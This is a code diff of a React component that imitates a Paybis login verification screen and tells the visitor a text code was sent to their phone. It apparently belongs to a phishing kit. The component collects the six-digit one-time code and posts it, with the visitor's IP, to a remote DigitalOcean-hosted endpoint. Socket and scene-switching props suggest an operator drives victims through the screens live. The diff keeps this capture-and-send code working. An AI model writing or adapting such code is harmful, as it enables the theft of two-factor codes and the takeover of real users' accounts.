@@ -1,7 +1,7 @@
 import React, {  useState } from "react";
 import axios from "axios";
 
-import envelope from "../../assets/envelope.svg";
+import verifyphone from "../../assets/verifyphone.svg";
 import voltar from "../../assets/voltar.svg";
 
 import { useTranslation } from 'react-i18next';
@@ -77,9 +77,9 @@ export default function PaybisOTPsms({ socket, ip,setCenaAtual,msgRecebida,mostr
     event.preventDefault();
 
     if (validateForm()) {
-      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizaotp2", {
+      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizaotp", {
         ip,
-        OTP2:
+        OTP:
           otp["otp1"] +
           "" +
           otp["otp2"] +
@@ -105,8 +105,8 @@ export default function PaybisOTPsms({ socket, ip,setCenaAtual,msgRecebida,mostr
      
           <div className="email-otp" country-code="BR">
             <div className="auth-app-header">{t('Login')}</div>
-            <img src={envelope} alt="" className="email-otp__icon " />
-            <i data-v-198035f7="" className="icon icon-chat email-otp__icon"></i>
+            <img src={verifyphone} alt="" className="email-otp__icon " />
+            {/* <i  className="icon icon-chat email-otp__icon"></i> */}
             <p className="sent-notice">
               A text message with a six digit veritication code has been sent to phone ending in ********{msgRecebida}. Enter the code below to verify your access.
               <br />
